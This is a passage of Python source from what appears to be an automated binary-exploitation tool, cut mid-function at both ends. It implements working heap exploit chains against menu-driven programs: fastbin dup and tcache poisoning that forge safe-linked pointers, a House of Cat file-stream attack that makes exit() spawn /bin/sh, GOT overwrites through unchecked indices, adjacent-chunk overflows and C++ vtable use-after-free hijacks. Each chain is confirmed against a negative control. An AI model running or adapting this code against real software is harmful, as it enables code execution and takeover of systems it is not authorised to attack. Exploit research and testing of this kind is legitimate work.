    process). Fill the tcache so frees reach the fastbin, free a/b/a (the fasttop check only blocks
    an immediate repeat, so a/b/a is allowed), drain the tcache, then reallocate the dup'd chunk
    and -- editing it as a LIVE chunk -- forge its fd to the fake-chunk target so a later malloc
    lands there; write win over the code pointer and trigger. The heap key comes from a lone freed
    chunk's safe-linked fd (a UAF view), so no address is baked in. `corrupt` forges a wrong fd for
    the negative control. Returns (key, trigger_output); key None when nothing recoverable.

    Allocation indices follow glibc's post-fastbin tcache STASHING (measured on glibc 2.41): after
    the tcache drain, d1 = alloc #(upfront+count) reclaims the fastbin head, and the forged chunk
    is handed out three allocations later."""
    from ..fuzz import menu
    from . import heap_groom
    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
    proc = spawn()
    try:
        _pie_drain(proc)

        def send(b):
            proc.stdin.write(b)
            proc.stdin.flush()

        def alloc():
            send(menu._scalar(add.encode(), width)
                 + menu._fill(model.get(add, []), num=str(req).encode(), width=width))
            _pie_drain(proc)

        def free_i(i):
            send(menu._scalar(free.encode(), width) + menu._scalar(str(i).encode(), width))
            _pie_drain(proc)

        def view_i(i):
            send(menu._scalar(view.encode(), width) + menu._scalar(str(i).encode(), width))
            return _pie_drain(proc)[0]

        def edit_i(i, payload):
            out = menu._scalar(edit.encode(), width) + menu._scalar(str(i).encode(), width)
            if "num" in model.get(edit, []):
                out += menu._scalar(str(len(payload)).encode(), width)
            send(out + menu._data(payload, width, term=False))
            _pie_drain(proc)

        n_up = _TCACHE_COUNT + 2                          # L + (count-1) fillers + a + b
        for _ in range(n_up):                             # 0 = L (leak), 1..(count-1) fillers, then a, b
            alloc()
        a_idx, b_idx = n_up - 2, n_up - 1
        free_i(0)                                         # L -> tcache: A.fd == A>>12
        leak = view_i(0)                                  # UAF view of the lone tcache chunk -> key
        key = heap_groom.parse_heap_key(leak if isinstance(leak, bytes) else leak.encode("latin1"))
        if key is None:
            return None, b""
        for i in range(1, _TCACHE_COUNT):                 # fill the tcache to its cap (L + these)
            free_i(i)
        free_i(a_idx)                                     # a -> fastbin (tcache full)
        free_i(b_idx)                                     # b -> fastbin
        free_i(a_idx)                                     # a again: fastbin dup (a, b, a)
        for _ in range(_TCACHE_COUNT):                    # drain the tcache
            alloc()
        d1 = n_up + _TCACHE_COUNT                          # reclaims the fastbin head (== a)
        alloc()                                           # d1
        mangled = heap_groom.forge_safelink_fd(key, target) if safe else target
        if corrupt:
            mangled ^= 0xDEAD0000
        edit_i(d1, _p64(mangled))                          # edit the LIVE dup'd chunk's fd
        alloc(); alloc()                                  # consume the stashed duplicates
        t_idx = d1 + 3
        alloc()                                           # lands ON target
        edit_i(t_idx, _p64(win_addr))                      # write win over the fake chunk's pointer
        _pie_drain(proc)
        tout = b""
        if trig is not None:
            send(menu._scalar(trig.encode(), width) + menu._scalar(str(t_idx).encode(), width))
            tout = _pie_drain(proc)[0]
        return key, (tout if isinstance(tout, bytes) else tout.encode("latin1"))
    except (BrokenPipeError, OSError):
        return None, b""
    finally:
        from ..dynamic import sandbox as _sb
        _sb.kill_quietly(proc)


def _fastbin_dup_chain(ctx, exe, target_bytes, win, opts, model, width, workdir, *,
                       glibc=None, libc_data=b""):
    """Double-free (CWE-415) -> control hijack via a leak-consuming safe-linked FASTBIN DUP. The
    complement to the tcache poison: that one needs a use-after-free WRITE to plant the fd; this
    one needs only a DOUBLE-FREE plus a normal edit of a live chunk (the dup hands the same chunk
    out twice). Gated on fastbins still existing (gone ~glibc 2.43) and on a fake-chunk target with
    a valid size field; marker-confirmed with a negative control, in one process (heap-ASLR defeat).
    Returns (roles, trig, target, size, key) or None."""
    from ..dynamic import heap_discover
    from .heap import fastbins_present
    fb = fastbins_present(libc_data) if libc_data else {"present": None}
    if fb.get("present") is False:                        # no fastbin to dup into -> not applicable
        return None
    roles = heap_discover.identify_heap_ops(workdir, exe, model, opts, width)
    if not roles or not roles.get("edit"):
        return None
    targets = _fastbin_fake_targets(exe, target_bytes)
    if not targets:
        return None
    win_name, win_addr = win
    safe = glibc is None or (isinstance(glibc, tuple) and tuple(glibc) >= (2, 32))
    spawn = _pie_spawn(workdir, exe)
    attempts = 0
    for tgt, size in targets:
        # Known static size -> use exactly it; runtime (unknown) -> try the common fastbin classes.
        reqs = [max(size - 8, 1)] if size else list(_FASTBIN_REQ_CLASSES)
        for req in reqs:
            for trig in list(opts) + [None]:
                if ctx.should_cancel() or attempts >= 220:
                    return None
                attempts += 1
                key, pos = _fastbin_dup_run(spawn, width, roles, trig, tgt, req, win_addr, model,
                                            safe=safe, corrupt=False)
                if key is None:
                    continue
                pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
                if not any(_WIN_OUT.search(ln) for ln in pos_lines):
                    continue
                _, neg = _fastbin_dup_run(spawn, width, roles, trig, tgt, req, win_addr, model,
                                          safe=safe, corrupt=True)
                neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
                if [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]:
                    used = req + 8
                    ctx.progress(msg=(f"fastbin dup: double-free a/b/a, fd := key^{tgt:#x} over the "
                                      f"fake chunk at {tgt:#x} (size {used:#x}) := &{win_name} -> ran"))
                    return roles, trig, tgt, used, key
    return None


# --------------------------------------------------------------- House of Cat (no-win FSOP -> shell)
# Big-chunk request for the unsorted-bin leak + the FILE blob (> tcache max, so it frees straight to
# the unsorted bin), and the small-chunk request for the single safe-linking tcache poison.
_HOC_BIG, _HOC_GUARD, _HOC_SMALL = 0x4F8, 0x18, 0x18


def _hoc_leak_and_blob_offsets():
    """The user-pointer distance from the leaked unsorted bk to the reclaimed chunk that will hold
    the FILE blob: the reclaimed chunk is the FIRST-freed big chunk (unsorted hands out its bk), and
    the leaked bk is the SECOND, one big chunk + one guard higher, so subtract both chunk sizes and
    add the 0x10 chunk->mem for the user pointer."""
    from .heap import request2size
    return request2size(_HOC_BIG) + request2size(_HOC_GUARD) - 0x10


def _hoc_run(spawn, width, roles, model, markers, uoff, cat, exit_seqs, *, corrupt):
    """One in-process House-of-Cat run on a NO-WIN heap target -> shell, ASLR-robust (leak + forge +
    poison + trigger in one process):

      1. unsorted leak -- free two big (> tcache-max) chunks and view the first: its fd is
         `main_arena+0x60` (libc base = fd - unsorted_bin_offset) and its bk is the other big chunk
         (a live heap address);
      2. the FILE  -- reclaim the first big chunk and write a `heap.build_house_of_cat` fake FILE
         into it (one bulk edit, no poison);
      3. the write -- ONE safe-linked tcache poison lands a chunk over `_IO_list_all` and points it
         at the fake FILE;
      4. the trigger -- an exit sequence returns from main, exit() walks `_IO_list_all`, and the
         fake FILE's vtable runs `system(" /bin/sh")`; the spawned shell then evaluates the
         forgery-proof marker command.

    `corrupt` points `_IO_list_all` at a WRONG address for the negative control (no shell). Returns
    (libc_base, shell_output). Never raises."""
    from ..fuzz import menu
    from . import heap as _heap, heap_groom
    add, free, view, edit = roles["add"], roles["free"], roles["view"], roles["edit"]
    proc = spawn()
    try:
        _pie_drain(proc)

        def send(b):
            proc.stdin.write(b)
            proc.stdin.flush()

        def alloc(req):
            send(menu._scalar(add.encode(), width)
                 + menu._fill(model_of(add), num=str(req).encode(), width=width))
            _pie_drain(proc)

        def free_i(i):
            send(menu._scalar(free.encode(), width) + menu._scalar(str(i).encode(), width))
            _pie_drain(proc)

        def view_i(i):
            send(menu._scalar(view.encode(), width) + menu._scalar(str(i).encode(), width))
            return _pie_drain(proc)[0]

        def edit_i(i, payload):
            out = menu._scalar(edit.encode(), width) + menu._scalar(str(i).encode(), width)
            if "num" in model_of(edit):
                out += menu._scalar(str(len(payload)).encode(), width)
            send(out + menu._data(payload, width, term=False))
            _pie_drain(proc)

        model_of = lambda o: model.get(o, [])

        # (1) unsorted leak: big1, guard, big2, guard -> free big1, big2 -> view big1
        alloc(_HOC_BIG); alloc(_HOC_GUARD); alloc(_HOC_BIG); alloc(_HOC_GUARD)   # 0,1,2,3
        free_i(0); free_i(2)
        leak = view_i(0)
        if len(leak) < 16:
            return None, b""
        fd = int.from_bytes(leak[:8], "little")
        bk = int.from_bytes(leak[8:16], "little")
        base = fd - uoff
        if base <= 0 or base & 0xFFF:                     # a real libc base is page aligned
            return None, b""
        blob_addr = bk - _hoc_leak_and_blob_offsets()
        # (2) reclaim big1 (unsorted hands out its bk == big1) and write the fake FILE into it
        blob = _heap.build_house_of_cat(blob_addr, wfile_jumps=base + cat["wfile_jumps"],
                                        plan="system", system=base + cat["system"],
                                        command=b" /bin/sh")
        alloc(_HOC_BIG)                                   # idx 4 == big1, now holds the blob
        edit_i(4, blob)
        # (3) one safe-linked tcache poison: a chunk over _IO_list_all, written with &blob
        list_all = base + cat["list_all"]
        alloc(_HOC_SMALL); alloc(_HOC_SMALL)              # 5, 6
        free_i(5); free_i(6)                              # tcache [6, 5]
        key = heap_groom.parse_heap_key(view_i(5))
        if key is None:
            return base, b""
        edit_i(6, _p64(key ^ (list_all & ~0xF)))          # poison head fd -> _IO_list_all (aligned)
        alloc(_HOC_SMALL); alloc(_HOC_SMALL)              # 7 == head, 8 == chunk at _IO_list_all
        target_val = blob_addr ^ (0xDEAD0000 if corrupt else 0)
        edit_i(8, _p64(target_val))                       # _IO_list_all := &blob (or wrong, for neg)
        # (4) trigger exit, then feed the spawned shell the forgery-proof marker command
        out = b""
        for seq in (tuple(exit_seqs) or (b"q\n",)):
            send(seq)
            out += _pie_drain(proc, total=0.6)[0]
            send(markers.command + b"\n")
            out += _pie_drain(proc, total=1.2)[0]
            if markers.proves(out) or proc.poll() is not None:
                break
        return base, (out if isinstance(out, bytes) else out.encode("latin1"))
    except (BrokenPipeError, OSError):
        return None, b""
    finally:
        from ..dynamic import sandbox as _sb
        _sb.kill_quietly(proc)


def _house_of_cat_shell(ctx, target, target_bytes, lead, vclass, *, exe, opts, model, width,
                        workdir, libc_data):
    """NO-WIN heap target -> shell via House of Cat (FSOP). The branch a heap bug fell into when the
    binary had no win function and no reachable code pointer: the tcache poison could land a chunk
    anywhere, but with nothing to point at it stopped at an L2 recipe. House of Cat needs no win --
    it forges a FILE and makes exit() run `system(" /bin/sh")`.

    Needs the linked libc (House-of-Cat offsets + the measured unsorted-bin offset), a view that
    discloses a heap pointer (the unsorted-bin leak), a UAF/edit to plant the poison fd, and an exit
    route. Marker-confirmed (a shell must EVALUATE the forgery-proof marker) with a negative control
    (a wrong `_IO_list_all` must not spawn one). Returns the filer's result dict or None."""
    from ..dynamic import heap_discover
    from . import attribution
    from . import heap as _heap
    if not libc_data:
        return None
    cat = _heap.house_of_cat_targets(libc_data, "system")
    if not cat or not cat.get("system"):
        return None
    try:
        libc_path = Path(workdir) / "libc_for_offset.so"
        libc_path.write_bytes(libc_data)
        uoff = _heap.unsorted_bin_offset(str(libc_path))
    except Exception:                                    # noqa: BLE001
        uoff = None
    if not uoff:
        return None
    roles = heap_discover.identify_heap_ops(workdir, exe, model, opts, width)
    if not roles or not roles.get("edit"):
        return None
    markers = attribution.make_code_markers()
    exit_seqs = _exit_sequences(opts, model, width)
    spawn = _pie_spawn(workdir, exe)
    base, pos = _hoc_run(spawn, width, roles, model, markers, uoff, cat, exit_seqs, corrupt=False)
    if not (base and markers.proves(pos)):
        ctx.emit("chain.hoc", payload={"ok": False, "libc_base": base,
                 "note": "House of Cat did not spawn a shell (no leak / plan mismatch)"})
        return None
    _, neg = _hoc_run(spawn, width, roles, model, markers, uoff, cat, exit_seqs, corrupt=True)
    if markers.proves(neg):                              # a wrong _IO_list_all also "won" -> unsound
        ctx.emit("chain.hoc", payload={"ok": False, "note": "negative control also spawned a shell"})
        return None
    ctx.progress(msg=(f"House of Cat: unsorted leak -> libc {base:#x}, fake FILE in a heap chunk, "
                      f"_IO_list_all poisoned -> exit ran system(\" /bin/sh\") -> shell"))
    return _file_house_of_cat_l3(ctx, target, lead, vclass, roles, base, uoff, cat, exit_seqs)


def _oob_write_seq(writer, fields, idx, value, trig, model, width) -> bytes:
    """Drive ONE indexed write: select `writer`, supply `idx` for its index field and `value` for
    its value field (menu._fill types each field), then optionally fire `trig` to force the call
    through the overwritten slot. The value is sent as a decimal (a `scanf("%ld")`/atoi value cell)
    -- the dominant CWE-129 write-a-cell shape; a raw-byte value cell is covered by the sequential
    _search_hijack path."""
    from ..fuzz import menu
    drive = menu._scalar(writer.encode(), width) + menu._fill(
        fields, idx=str(idx).encode(), num=str(value).encode(), width=width)
    if trig is None:
        return drive
    return drive + menu._scalar(trig.encode(), width) + menu._fill(model.get(trig, []), width=width)


def _oob_write_hijack(ctx, capture, target_bytes, exe, opts, model, win_addr, *, width=None):
    """CWE-129/787 unchecked indexed write -> control-flow hijack (a write-WHAT-WHERE, not a
    sequential overflow). A menu option computes `arr[idx] = value` with no bound check on `idx`;
    choosing `idx` so `arr_base + idx*stride` lands on a GOT slot (or a called-through global
    function pointer) and `value = win_addr` overwrites that pointer, so the next call through it
    enters win. _search_hijack walks byte offsets in one buffer; here the INDEX is the address
    selector, so the whole GOT (and writable fn-pointers) are reachable, well outside the array.

    Searches (array, write option, target slot, trigger). Confirm = the win breakpoint is hit AND a
    negative control (value replaced with a benign address) does NOT hit it, proving the overwrite
    -- not incidental flow -- caused arrival. Returns (seq, writer, idx, target_addr, trig, name)
    or None. Bounded; early-exits on the first confirmed hijack. Non-PIE (absolute GOT/global
    addresses); a PIE target's indexed write is handled by the leak-relocating _pie_leak_chain."""
    from ..dynamic import oob_index
    from . import exploit, rop

    arrays = (oob_index._array_candidates(exploit.elf_objects_sized(target_bytes))
              or oob_index._array_candidates_symfree(Path(exe)))
    if not arrays:
        return None

    # arbitrary-write targets: every GOT slot (overwriting it redirects that libc call), ordered so
    # the functions a menu loop re-calls come first -- their call is the implicit next-prompt
    # trigger, so a hijack confirms with trig=None and the search stays short. Writable global
    # function pointers referenced by the code are appended as secondary targets.
    got = rop.got_entries(target_bytes)
    _HOT = ("printf", "puts", "fwrite", "fflush", "putchar", "fputs", "__printf_chk",
            "fgets", "scanf", "__isoc99_scanf", "read", "write")
    got_targets = sorted(got.items(),
                         key=lambda kv: (_HOT.index(kv[0]) if kv[0] in _HOT else 99, kv[0]))
    targets = [(a, f"{n}@got") for n, a in got_targets]
    targets += [(a, f"fnptr@{a:x}") for a in _writable_globals(exe) if a not in got.values()]
    if not targets:
        return None

    # write options: an option whose template reads an index AND at least one more scalar (the value
    # cell). Fall back to any index-taking option (the crawl may have learned only the index field).
    writers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) >= 2] or \
              [o for o in opts if o in model and "idx" in model[o]]
    if not writers:
        return None
    triggers = [None] + [o for o in opts if o in model][:3]

    attempts = 0
    for arr in arrays:
        base, stride, cap = arr["addr"], arr.get("stride", 8), arr["cap"]
        for tgt_addr, tgt_name in targets:
            if stride <= 0 or (tgt_addr - base) % stride:
                continue
            idx = (tgt_addr - base) // stride
            if not (-(cap + 4096) <= idx <= cap + 4096):     # a plausibly-unchecked index, bounded
                continue
            for writer in writers:
                fields = model[writer]
                for trig in triggers:
                    if ctx.should_cancel() or attempts >= 240:
                        return None
                    attempts += 1
                    seq = _oob_write_seq(writer, fields, idx, win_addr, trig, model, width)
                    if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                        continue
                    neg = _oob_write_seq(writer, fields, idx, win_addr ^ 0xFFFF, trig, model, width)
                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                        continue                             # reached without our value -> not ours
                    ctx.progress(msg=f"indexed-write hijack: option {writer} sets "
                                     f"{arr['name']}[{idx}] ({tgt_name}) := win -> win reached")
                    return seq, writer, idx, tgt_addr, trig, tgt_name
    return None


def _search_hijack(ctx, capture, prime, model, writers, triggers, win_addr, *, width=None):
    """Overwrite an adjacent code pointer with `win_addr` and confirm the trigger calls it.

    Search the (writer option, overwrite offset, trigger option) space: place win_addr at each
    8-byte offset of an over-long payload from a data-writing option, then drive each candidate
    trigger. Confirm = the win breakpoint is hit AND a negative control (win bytes replaced) does
    NOT hit it, proving the overwrite caused arrival. Bounded; early-exits on the first hijack."""
    from ..fuzz import menu
    from . import exploit
    attempts = 0
    for writer in writers:
        wf = model.get(writer, [])
        for widx in (b"0", b"1"):                        # object whose buffer we overflow
            for off in range(8, 72, 8):
                drive = menu._scalar(writer.encode(), width) + _drive_overflow(
                    wf, b"A" * off + _p64(win_addr), idx=widx, width=width)
                for trig in triggers:
                    # the object the trigger uses: usually the one ADJACENT to the overflow.
                    for tidx in ((None,) if trig is None else (b"1", b"0")):
                        if ctx.should_cancel() or attempts >= 260:
                            return None
                        attempts += 1
                        tail = b"" if trig is None else (
                            menu._scalar(trig.encode(), width)
                            + menu._fill(model.get(trig, []), idx=tidx, width=width))
                        seq = prime + drive + tail
                        if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                            continue
                        neg = prime + menu._scalar(writer.encode(), width) + _drive_overflow(
                            wf, b"A" * off + b"C" * 8, idx=widx, width=width) + tail
                        if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                            continue                     # reached without the overwrite -> not ours
                        ctx.progress(msg=f"hijack: option {writer} (obj {widx.decode()}) writes "
                                         f"a code pointer at +{off} -> win reached")
                        return seq, writer, off, trig
    return None


def _computed_adjacent_hijack(ctx, capture, opts, model, width, win_addr):
    """Adjacent-chunk overflow -> function-pointer hijack with the overflow distance COMPUTED
    from the allocator model (`heap_groom`), not brute-forced.

    `_search_hijack` walks a fixed 8..64-byte offset window. A large overflow buffer puts the
    victim's chunk -- and the inline code pointer in it -- `request2size(size)` bytes away, far
    past that window, so that search cannot reach it AT ALL (a malloc(0x100) buffer's neighbour
    is 0x110 bytes on, not <=64). Here the groom picks the allocation size, so `heap_groom`
    PROVES the exact adjacency distance (`request2size(size)+fptr_off`, via `TcacheModel`) and we
    aim the overwrite straight at it -- no cap. The overflow buffer and the victim object are
    allocated back to back so they land adjacent on the arena top; because we do not know which
    option makes the victim (the one with the called pointer) or which calls it, we try each --
    the oracle below keeps a wrong guess from ever confirming.

    Same 0-false-confirmation oracle as every other hijack here: the win breakpoint must fire for
    the real overwrite AND NOT for the negative control (the groom one word short of the pointer),
    so a target that reaches win on its own, or via anything but our write, is rejected. Bounded
    and best-effort; returns (seq, buf_opt, obj_opt, writer, distance, trig) or None.
    """
    from ..fuzz import menu
    from . import exploit, heap_groom

    buf_opts = [o for o in opts if o in model and menu._is_alloc(model[o])]
    if not buf_opts:
        return None
    # The victim is whatever option creates the object with the inline pointer: an idx-led
    # "make a default object" option is the usual shape, so try those first, then the allocating
    # options themselves (a sized creator can be its own victim).
    obj_opts = [o for o in opts if o in model and model[o][:1] == ["idx"]
                and not menu._is_alloc(model[o])] + buf_opts
    triggers = [o for o in opts if o in model and model[o][:1] == ["idx"]] or list(opts)

    def _alloc(opt, idx, size):
        f = model.get(opt, [])
        return menu._scalar(opt.encode(), width) + menu._fill(
            f, idx=idx, num=str(size).encode(), width=width)

    def _edit(opt, idx, data):
        # idx, [length,] then the raw overflow bytes WITHOUT a terminator -- an exact-length
        # read() would otherwise leave a stray newline in the pipe and desync the trigger.
        f = model.get(opt, [])
        out = menu._scalar(opt.encode(), width) + menu._scalar(idx, width)
        if "num" in f:
            out += menu._scalar(str(len(data)).encode(), width)
        return out + menu._data(data, width, term=False)

    def _call(opt):
        return menu._scalar(opt.encode(), width) + menu._fill(
            model.get(opt, []), idx=b"1", width=width)

    attempts = 0
    # Sizes whose request2size lands the victim well past _search_hijack's 64-byte window, so this
    # path is the only one that reaches them; both are common real "big buffer" allocations.
    for size in (0x100, 0x90):
        for fptr_off in (0, 8, 16, 24):
            try:
                plan = heap_groom.plan_adjacent_overflow(size, win_addr, obj_fptr_off=fptr_off)
            except Exception:                            # noqa: BLE001 -- model mismatch; skip size
                continue
            for buf_opt in buf_opts:
                for obj_opt in obj_opts:
                    for writer in opts:
                        for trig in triggers:
                            if ctx.should_cancel() or attempts >= 300:
                                return None
                            attempts += 1
                            spec = heap_groom.MenuSpec(
                                alloc_buf=lambda sz, b=buf_opt: _alloc(b, b"0", sz),
                                alloc_obj=lambda o=obj_opt: (
                                    _alloc(o, b"1", 0x18) if menu._is_alloc(model.get(o, []))
                                    else _call(o)),
                                edit_buf=lambda data, w=writer: _edit(w, b"0", data),
                                trigger=lambda t=trig: _call(t),
                            )
                            pos = heap_groom.lower(plan, spec)
                            if not exploit.reached(capture(pos, breakpoints=[win_addr]), win_addr):
                                continue
                            neg = heap_groom.lower(plan, spec, negative=True)
                            if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                                continue                 # reached without our overwrite -> not ours
                            ctx.progress(msg=(
                                f"computed hijack: {buf_opt} size {size:#x} + {obj_opt}, option "
                                f"{writer} overflows a code pointer at computed "
                                f"+{plan.overflow_distance} -> win reached"))
                            return pos, buf_opt, obj_opt, writer, plan.overflow_distance, trig
    return None


# ------------------------------------------------------- live tcache-poisoning (double-free / UAF)
def _writable_globals(exe) -> list[int]:
    """16-aligned writable-global addresses referenced by the code -- candidate function-pointer
    targets to allocate a chunk over. 16-aligned because glibc 2.32+ rejects an unaligned tcache
    chunk. Both an absolute displacement and objdump's computed `# <vaddr>` (PIE) are read."""
    import subprocess

    from ..dynamic.oob_index import _data_ranges
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", "-M", "intel", str(exe)],
                             capture_output=True, text=True, timeout=60).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    ranges = _data_ranges(exe)

    def in_data(a):
        return any(s <= a < e for s, e in ranges)

    seen = set()
    for m in re.finditer(r"(?:\+0x([0-9a-fA-F]+)\]|#\s*([0-9a-fA-F]+)\b)", out):
        a = int(m.group(1) or m.group(2), 16)
        if a % 16 == 0 and in_data(a):
            seen.add(a)
    return sorted(seen)[:12]


def _trace_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> tuple:
    """Run the drive under the heaptrace ptrace helper and return the FIRST allocation as
    (chunk_address, requested_size), or (None, None). Deterministic under ASLR-off. Runs the helper
    DIRECTLY (via ctx.run_subprocess, like make_capture) rather than under bwrap, so the heap layout
    matches the capture() runs the exploit is confirmed under -- and so a C++ target (whose bwrap
    sandbox may lack libstdc++) is still traced."""
    import json

    from ..dynamic import heap_discover
    plt = bool(alloc_info.get("plt"))
    ret_offs = [] if plt else heap_discover._alloc_ret_offsets(exe, alloc_info["alloc_name"])
    helper = workdir / "heaptrace.py"
    if not helper.exists():
        helper.write_bytes((Path(heap_discover.__file__).with_name("heaptrace.py")).read_bytes())
    report = workdir / "areport.json"
    report.unlink(missing_ok=True)
    (workdir / "aspec.json").write_text(json.dumps({
        "exe": str(exe), "stdin": drive.hex(), "free_off": alloc_info["free"],
        "alloc_off": alloc_info["alloc"], "alloc_ret_offs": ret_offs, "alloc_is_plt": plt,
        "pie": False, "ignore_ranges": [], "report": str(report), "timeout": 6}))
    try:
        ctx.run_subprocess([sys.executable, str(helper), str(workdir / "aspec.json"),
                            str(report)], timeout=12)
        rep = json.loads(report.read_text())
        addrs, sizes = rep.get("alloc_addrs") or [], rep.get("alloc_sizes") or []
    except Exception:
        observe.absorbed(_log, "falling back")
        return None, None
    if not addrs:
        return None, None
    return int(addrs[0], 16), (int(sizes[0]) if sizes else None)


def _trace_first_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> int | None:
    """The FIRST chunk address a drive allocates (the safe-linking fd mangle needs it); size-less
    wrapper over _trace_alloc for the tcache-poison caller."""
    return _trace_alloc(ctx, exe, alloc_info, drive, width, workdir)[0]


def _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts, model, width,
                  workdir, capture, glibc=None):
    """Drive a live tcache-poisoning chain: free a chunk, overwrite its fd (via the UAF/double-free)
    with a mangled pointer to a code-pointer target, allocate twice to obtain a chunk AT the target,
    write the win address there, and trigger. Confirms control reached the win under the debugger,
    with a negative control. ASLR-off makes the chunk address (hence the safe-linking mangle)
    deterministic. Returns (sequence, target, trigger) on success, else None."""
    from ..dynamic import heap_discover, heaptrace
    from ..fuzz import menu
    from . import exploit
    # Safe-linking (the tcache fd mangle `(addr>>12)^fd`) landed in glibc 2.32. Mangling on a
    # PRE-2.32 target produces a wrong fd and the poison silently never confirms -- the bug the
    # audit found (the computed glibc version was dropped before this chain). Mangle only when the
    # target's glibc is >= 2.32, or when the version is unknown (modern default, fail toward the
    # common case). `glibc` is (major, minor) from rop.libc_version, or None.
    safe_linking = glibc is None or (isinstance(glibc, tuple) and tuple(glibc) >= (2, 32))
    alloc_info = heaptrace.identify_allocator(functions, edges) or heap_discover._libc_plt_pair(exe)
    if not alloc_info:
        return None
    alloc_opt = next((o for o in opts if o in model and "num" in model[o]), None)
    free_opt = next((o for o in opts if o in model and model[o] == ["idx"]), None)
    edit_opt = next((o for o in opts if o in model and model[o][:1] == ["idx"]
                     and "str" in model[o]), None)
    if not (alloc_opt and free_opt and edit_opt):
        return None
    targets = _writable_globals(exe)
    if not targets:
        return None
    win_name, win_addr = win

    def _op(opt, num=None):                               # an alloc/menu option, size = num
        return menu._scalar(opt.encode(), width) + menu._fill(
            model[opt], num=(str(num).encode() if num is not None else b"16"), width=width)

    def _idx_op(opt, idx):                                # a free option on index `idx`
        return menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width)

    def _edit(idx, payload, pad):                         # edit index `idx`, write raw `payload`
        return (menu._scalar(edit_opt.encode(), width) + menu._scalar(str(idx).encode(), width)
                + menu._data(payload.ljust(pad, b"\x00"), width))

    # the freed chunk's address (for the safe-linking mangle): trace one allocation.
    a = _trace_first_alloc(ctx, exe, alloc_info, _op(alloc_opt, 24) + _idx_op("9", 0),
                           width, workdir)
    if not a:
        return None

    for size in (24, 16, 40):
        for pad in (size, 24, 32):
            for tgt in targets:
                if ctx.should_cancel():
                    return None
                mangled = ((a >> 12) ^ tgt) if safe_linking else tgt   # safe-linking: glibc >= 2.32
                poison = (_op(alloc_opt, size) + _idx_op(free_opt, 0) + _edit(0, _p64(mangled), pad)
                          + _op(alloc_opt, size) + _op(alloc_opt, size)
                          + _edit(2, _p64(win_addr), pad))
                for trig in opts:
                    seq = poison + _idx_op(trig, 0)
                    if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                        continue
                    neg = (_op(alloc_opt, size) + _idx_op(free_opt, 0)
                           + _edit(0, _p64(mangled), pad)
                           + _op(alloc_opt, size) + _op(alloc_opt, size)
                           + _edit(2, _p64(0xdead), pad) + _idx_op(trig, 0))
                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                        continue                          # reached without our write -> not ours
                    ctx.progress(msg=f"tcache-poison: chunk over {hex(tgt)} -> {win_name} "
                                     f"(size {size}, trigger {trig})")
                    return seq, tgt, trig
    return None


def _is_cpp_heap(target_bytes) -> bool:
    """The target allocates C++ objects: its PLT imports `operator new` AND `operator delete`
    (_Znwm/_Znam paired with _ZdlPv*/_ZdaPv*). A polymorphic such object carries a vtable pointer at
    offset 0 -- the thing a use-after-free lets us overwrite."""
    from . import rop
    got = rop.got_entries(target_bytes)
    return (any(n in got for n in ("_Znwm", "_Znam"))
            and any(n in got for n in ("_ZdlPv", "_ZdlPvm", "_ZdaPv", "_ZdaPvm")))


def _cpp_vtable_uaf(ctx, target, target_bytes, exe, functions, edges, win, opts, model, width,
                    workdir, capture):
    """C++ use-after-free -> vtable hijack. A freed polymorphic object keeps a dangling reference; a
    later write reclaims (or writes straight through) the chunk and replaces its vtable POINTER
    (object offset 0), so the next virtual call dispatches through an attacker vtable to win.

    The reclaimed chunk address is deterministic under ASLR-off, so we build the fake vtable INLINE
    in the object: offset 0 -> chunk+8, and every following word -> win. A virtual call
    `mov rax,[obj]; call [rax+N]` then reads vtable=chunk+8 and calls *(chunk+8+N)=win for every
    small N -- no leak and no fixture gadget needed. The menu crawl is empty for a C++ target (its
    bwrap sandbox may lack libstdc++), so roles are SEARCHED, not read from the model: probe which
    option allocates (new), then permute the rest as (free, edit, show) and confirm the win
    breakpoint is hit AND a negative control (fake vtable -> a benign address) is NOT. Returns
    (seq, new_opt, free_opt, edit_opt, show_opt, chunk, size) or None. Non-PIE."""
    from ..dynamic import heap_discover
    if not _is_cpp_heap(target_bytes):
        return None
    alloc_info = heap_discover._libc_plt_pair(exe)
    if not alloc_info:
        return None
    win_name, win_addr = win

    # candidate roles: index-taking options (fall back to every option when the crawl learned none).
    cand = [o for o in opts if o in model and "idx" in model[o]] or list(opts)
    cand = [o for o in cand if o != "0"][:6]
    if len(cand) < 2:
        return None

    # THE MENU'S OWN WIDTH, not the target's. `shared_op_model` infers ONE width for the whole
    # program, and a C++ notebook commonly has both: the menu choice read with `scanf("%d")` or
    # `cin >>` (line-driven) and ONE data option reading a fixed block -- `read(0, obj, 48)`, which
    # is exactly the write this hijack needs. That single raw read made the crawl call the whole
    # target 48-byte fixed-width, so every option selector went out padded to 48 bytes, the menu
    # consumed one number and 46 bytes of filler desynced everything after it **[measured: the
    # model came back {1:[],2:[],3:[],4:[]} with width=48 and the hijack never fired]**. The
    # inference is not trusted alone: both encodings are tried, the detected one first.
    # ...and whether the option takes an INDEX at all. A notebook with a slot table reads one
    # (`delete(slot)`), a single-object demo reads none -- and an index sent to a program that
    # does not read it is left in the pipe, where the next option's `read(0, obj, 48)` swallows
    # it: the forged vtable pointer then lands two bytes into the object instead of at offset 0.
    # Four passes at most, detected-and-indexed first, and each is bounded by its own attempt cap.
    for sel_width in ([width] if width is None else [width, None]):
        for send_idx in (True, False):
            hit = _cpp_vtable_uaf_at(ctx, target, exe, functions, edges, win, cand, model,
                                     sel_width, workdir, capture, alloc_info, send_idx,
                                     pad_to=width)
            if hit:
                return hit
    return None


def _cpp_vtable_uaf_at(ctx, target, exe, functions, edges, win, cand, model, width, workdir,
